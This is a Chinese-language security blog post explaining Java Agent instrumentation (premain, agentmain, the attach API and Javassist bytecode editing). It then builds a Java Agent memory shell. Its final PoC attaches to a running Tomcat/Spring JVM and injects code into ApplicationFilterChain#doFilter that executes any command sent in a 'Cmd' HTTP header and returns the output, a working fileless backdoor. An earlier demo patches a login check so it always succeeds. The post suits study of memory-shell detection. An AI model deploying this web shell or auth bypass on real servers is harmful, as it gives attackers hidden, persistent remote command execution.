---
title: "Java Agent 内存马"
date: 2025-04-21T13:50:08+08:00
lastmod: 2025-04-21T13:50:08+08:00
draft: fa,se
keywords: []
description: ""
tags: ["java", "agent", "内存马"]
categories: ["java"]
author: "w0s1np"

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: true
toc: true
autoCollapseToc: false
postMetaInFooter: false
hiddenFromHomePage: false
# You can also define another contentCopyright. e.g. contentCopyright: "This is another copyright."
contentCopyright: false
reward: false
mathjax: false
mathjaxEnableSingleDollar: false
mathjaxEnableAutoNumber: false

# You unlisted posts you might want not want the header or footer to show
hideHeaderAndFooter: false

# You can enable or disable out-of-date content warning for individual post.
# Comment this out to use the global config.
#enableOutdatedInfoWarning: false

flowchartDiagrams:
  enable: true
  options: ""

sequenceDiagrams: 
  enable: true
  options: ""

---

<!--more-->
## Java Agent介绍

> Java Agent 简单来说就是 JVM 提供的一种动态 hook class 字节码的技术
>
> 通过 Instrumentation (Java Agent API), 开发者能够以一种无侵入的方式 (类似 Spring AOP), 在 JVM 加载某个 class 之前修改其字节码的内容, 同时也支持重加载已经被加载过的 class

### premain(静态Instrument)

通过 `-javaagent`​ 参数指定 agent, 从而在 JVM 启动之前修改 class 内容 (自 JDK 1.5)

需要实现 premain 方法:

```java
public static void premain(String agentArgs, Instrumentation inst);
public static void premain(String agentArgs);
```

带有 Instrumentation inst 参数的方法优先级更高, 会优先被调用

#### 实验

目录情况如下:

```java
-java-agent
----src
--------main
--------|------java
--------|----------com.example.agent
--------|------------PreMainTraceAgent
--------|resources
-----------META-INF
--------------MANIFEST.MF
```

MANIFREST.MF：

```java
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: PreMainTraceAgent

```

或者不去手动写MANIFREST.MF文件的方式，使用maven插件：

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-jar-plugin</artifactId>
    <version>3.1.0</version>
    <configuration>
        <archive>
            <!--自动添加META-INF/MANIFEST.MF -->
            <manifest>
                <addClasspath>true</addClasspath>
            </manifest>
            <manifestEntries>
                <Premain-Class>com.example.agent.PreMainTraceAgent</Premain-Class>
                <Agent-Class>com.example.agent.PreMainTraceAgent</Agent-Class>
                <Can-Redefine-Classes>true</Can-Redefine-Classes>
                <Can-Retransform-Classes>true</Can-Retransform-Classes>
            </manifestEntries>
        </archive>
    </configuration>
</plugin>
```

测试代码:

```java
package com.example.agent;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class PreMainTraceAgent {

    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("agentArgs : " + agentArgs);
        inst.addTransformer(new DefineTransformer(), true);
    }

    static class DefineTransformer implements ClassFileTransformer{

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            System.out.println("premain load Class:" + className);
            return classfileBuffer;
        }
    }
}
```

然后使用maven插件打包即可

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504211347143.png)

再重新开一个工程, 然后只需要写一个带 main 方法的类即可：

```java
public class TestMain {

    public static void main(String[] args) {
        System.out.println("main start");
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("main end");
    }
}
```

通过配置 VM options : `-javaagent:jarpath`​

> 根据输出结果我们能够发现：
>
> 1. 执行 main 方法之前会加载所有的类，包括系统类和自定义类；
> 2. 在 ClassFileTransformer 中会去拦截系统类和自己实现的类对象；
> 3. 如果你有对某些类对象进行改写，那么在拦截的时候抓住该类使用字节码编译工具即可实现。

### agentmain(动态Instrument)

需要实现 agentmain 方法

```java
// 采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成
// 这个时候需要借助Instrumentation#retransformClasses(Class<?>... classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调
public static void agentmain (String agentArgs, Instrumentation inst)
public static void agentmain (String agentArgs)
```

#### 实验

MANIFREST.MF：

```java
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: com.example.agent.AgentMainTest
```

或者

```xml
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-jar-plugin</artifactId>
  <version>3.1.0</version>
  <configuration>
    <archive>
      <!--自动添加META-INF/MANIFEST.MF -->
      <manifest>
        <addClasspath>true</addClasspath>
      </manifest>
      <manifestEntries>
        <Agent-Class>com.example.agent.AgentMainTest</Agent-Class>
        <Can-Redefine-Classes>true</Can-Redefine-Classes>
        <Can-Retransform-Classes>true</Can-Retransform-Classes>
      </manifestEntries>
    </archive>
  </configuration>
</plugin>
```

这样就能对已经执行的 java 服务进行 attach, 然后执行我们的agentmain()中的代码:

```java
package com.example.agent;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

/**
 * @author rickiyang
 * @date 2019-08-16
 * @Desc
 */
public class AgentMainTest {

    public static void agentmain(String agentArgs, Instrumentation instrumentation) {
        instrumentation.addTransformer(new DefineTransformer(), true);
    }

    static class DefineTransformer implements ClassFileTransformer {

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            System.out.println("premain load Class:" + className);
            return classfileBuffer;
        }
    }
}
```

```java
package com.example.agent_test;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

/**
 * @author rickiyang
 * @date 2019-08-16
 * @Desc
 */
public class TestAgentMain {

    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        //获取当前系统中所有 运行中的 虚拟机
        System.out.println("running JVM start ");
        List<VirtualMachineDescriptor> list = VirtualMachine.list();	// 得到 JVM 进程列表
        for (VirtualMachineDescriptor vmd : list) {
            //如果虚拟机的名称为 xxx 则 该虚拟机为目标虚拟机，获取该虚拟机的 pid
            //然后加载 agent.jar 发送给该虚拟机
            System.out.println(vmd.displayName());	// 进程名
            if (vmd.displayName().endsWith("com.example.agent_test.TestAgentMain")) {
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                virtualMachine.loadAgent("/Users/lnhsec/Desktop/Lnh/Java/agent/target/agent-0.0.1-SNAPSHOT.jar");
                virtualMachine.detach();
            }
        }
    }

}
```

### Instrumentation 修改字节码

Instrumentation 就是 Java Agent 提供给我们的用于修改 class 字节码的 API

它的的具体使用可参考官方文档

[https://docs.oracle.com/javase/9/docs/api/java.instrument-summary.html](https://docs.oracle.com/javase/9/docs/api/java.instrument-summary.html)

常见用法:

```java
// 获取已被 JVM 加载的所有 class
Class[] getAllLoadedClasses();

// 添加 transformer 用于拦截即将被加载或重加载的 class, canRetransform 参数用于指定能否利用该 transformer 重加载某个 class
void addTransformer(ClassFileTransformer transformer, boolean canRetransform);

// 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class
void retransformClasses(Class<?>... classes);
```

添加的 transformer 必须要实现 ClassFileTransformer 接口

```java
public interface ClassFileTransformer {
    byte[]
    transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer)
        throws IllegalClassFormatException;
}
```

className 是 JVM 形式的 class name, 例如`java.util.HashMap`​在 JVM 中的形式为`java/util/HashMap`​(`.`​被替换成了`/`​)

classfileBuffer 是原始的 class 字节码, 如果我们不想修改某个 class 就需要把这个变量原样返回

剩下的参数一般用不到

为了演示修改字节码这个过程, 先准备一个测试程序

```java
package com.example.agent;

public class CrackTest {
    public static String username = "admin";
    public static String password = "fakepassword";

    public static boolean checkLogin(){
        if (username == "admin" && password == "admin"){
            return true;
        } else {
            return false;
        }
    }
    public static void main(String[] args) throws Exception{
        while(true){
            if (checkLogin()){
                System.out.println("login success");
            } else {
                System.out.println("login failed");
            }
            Thread.sleep(1000);
        }
    }
}
```

```java
package com.example.agent;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;

public class CrackDemo {

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        for(Class clazz : inst.getAllLoadedClasses()){ // 先获取到所有已加载的 class
            if (clazz.getName().equals("com.example.agent.CrackTest")){
                inst.addTransformer(new TransformerDemo(), true); // 添加 transformer
                inst.retransformClasses(clazz); // 重加载该 class
            }
        }
    }

    public static void main(String[] args) throws Exception{
        String pid, name;
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            pid = vmd.id();
            name = vmd.displayName();
            if (name.equals("com.example.agent.CrackTest")){
                System.out.println(1111111);
                VirtualMachine vm = VirtualMachine.attach(pid);
                vm.loadAgent("/Users/lnhsec/Desktop/Lnh/Java/agent/target/agent-0.0.1-SNAPSHOT.jar");
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }
}

class TransformerDemo implements ClassFileTransformer{
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("com/example/agent/CrackTest")) { // 因为 transformer 会拦截所有待加载的 class, 所以需要先检查一下 className 是否匹配
            try {
                ClassPool pool = ClassPool.getDefault();
                CtClass clazz = pool.get("com.example.agent.CrackTest");
                CtMethod method = clazz.getDeclaredMethod("checkLogin");
                method.setBody("{System.out.println(\"inject success!!!\"); return true;}"); // 利用 Javaassist 修改指定方法的代码
                byte[] code = clazz.toBytecode();
                clazz.detach();
                return code;
            } catch (Exception e) {
                e.printStackTrace();
                return classfileBuffer;
            }
        } else {
            return classfileBuffer;
        }
    }
}
```

```xml
<plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>3.1.0</version>
                <configuration>
                    <archive>
                        <!--自动添加META-INF/MANIFEST.MF -->
                        <manifest>
                            <addClasspath>true</addClasspath>
                        </manifest>
                        <manifestEntries>
                            <Agent-Class>com.example.agent.CrackDemo</Agent-Class>
                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
                        </manifestEntries>
                    </archive>
                </configuration>
            </plugin>
```

## Java Agent 内存马

实现的思路就是找一个比较通用的类, 保证每一次 request 请求都能调用到它的某一个方法, 然后利用 Javaassist 插入恶意 Java 代码

可以首先写一个`Controller`​, 然后看会触发哪些地方, 如果存在req和resp, 即可修改class, 注入内存马

```java
package com.example.agent.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class helloController {

    @RequestMapping("/hello")
    public String sayHello() {
        try {
            System.out.println("hello world");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "hello w0s1np"; // 返回字符串而不是视图
    }
}
```

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504211347081.png)

它的 doFilter 会调用 internalDoFilter, 后者依次取出各种 filter 并链式调用其 doFilter 方法

可以看到`ApplicationFilterChain#doFilter`​触发了多次, 并且其参数为:`(ServletRequest request, ServletResponse response)`​, 那么只需要重写该方法即可

### ApplicationFilterChain#doFilter

#### poc

```java
package com.example.agent.mem;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;


public class agentmain_test {

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        Class[] classes = inst.getAllLoadedClasses();
        // 判断类是否已经加载
        for (Class aClass : classes) {
            if (aClass.getName().equals(DefineTransformer.editClassName)) {
                // 添加 Transformer
                inst.addTransformer(new DefineTransformer(), true);
                // 触发 Transformer
                inst.retransformClasses(aClass);
            }
        }
    }

    public static void main(String[] args) throws Exception{
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor desc : list){
            String name = desc.displayName();
            String pid = desc.id();

            if (name.contains("com.example.agent.AgentApplication")){
                VirtualMachine vm = VirtualMachine.attach(pid);
                System.out.println("pid: " + pid);
                vm.loadAgent("/Users/lnhsec/Desktop/Lnh/Java/agent/target/agent-0.0.1-SNAPSHOT.jar");
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }

    static class DefineTransformer implements ClassFileTransformer {
        public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
        public static final String editMethod = "doFilter";
//		  public static final String editClassName = "org.apache.catalina.core.StandardWrapperValve";
//        public static final String editMethod = "invoke";

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            if (className.replace("/", ".").equals(editClassName)) { // 因为 transformer 会拦截所有待加载的 class, 所以需要先检查一下 className 是否匹配
                try {
                    ClassPool pool = ClassPool.getDefault();
                    CtClass clazz = pool.get(editClassName);
                    CtMethod method = clazz.getDeclaredMethod(editMethod);
                    method.insertBefore("javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n" +
                            "String cmd = httpServletRequest.getHeader(\"Cmd\");\n" +
                            "if (cmd != null){\n" +
                            "    Process process = Runtime.getRuntime().exec(cmd);\n" +
                            "    java.io.InputStream input = process.getInputStream();\n" +
                            "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n" +
                            "    StringBuilder sb = new StringBuilder();\n" +
                            "    String line = null;\n" +
                            "    while ((line = br.readLine()) != null){\n" +
                            "        sb.append(line + \"\\n\");\n" +
                            "    }\n" +
                            "    br.close();\n" +
                            "    input.close();\n" +
                            "    response.getOutputStream().print(sb.toString());\n" +
                            "    response.getOutputStream().flush();\n" +
                            "    response.getOutputStream().close();\n" +
                            "}"); // 利用 Javaassist 修改指定方法的代码
                    byte[] code = clazz.toBytecode();
                    clazz.detach();
                    return code;
                } catch (Exception e) {
                    e.printStackTrace();
                    return classfileBuffer;
                }
            } else {
                return classfileBuffer;
            }
        }
    }
}
```

```java
<plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>3.1.0</version>
                <configuration>
                    <archive>
                        <!--自动添加META-INF/MANIFEST.MF -->
                        <manifest>
                            <addClasspath>true</addClasspath>
                        </manifest>
                        <manifestEntries>
                            <Agent-Class>com.example.agent.mem.agentmain_test</Agent-Class>
                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
                        </manifestEntries>
                    </archive>
                </configuration>
            </plugin>
```

### StandardWrapperValve#invoke

可以从上面的调用栈看见, 当我们访问一个控制器时, 会多次触发`ApplicationFilterChain#doFilter`​, 那么打内存马也会这样, 就导致动静太大

往前看一个就找到`StandardWrapperValve#invoke`:

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504211347500.png)

也有我们需要的req、resp, 那么只需要修改上面的classname和method

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504211347917.png)

## 参考

https://www.cnblogs.com/rickiyang/p/11368932.html

https://exp10it.io/2023/01/java-agent-memory-shell/#agentmain-%E6%96%B9%E5%BC%8F

https://xz.aliyun.com/news/8949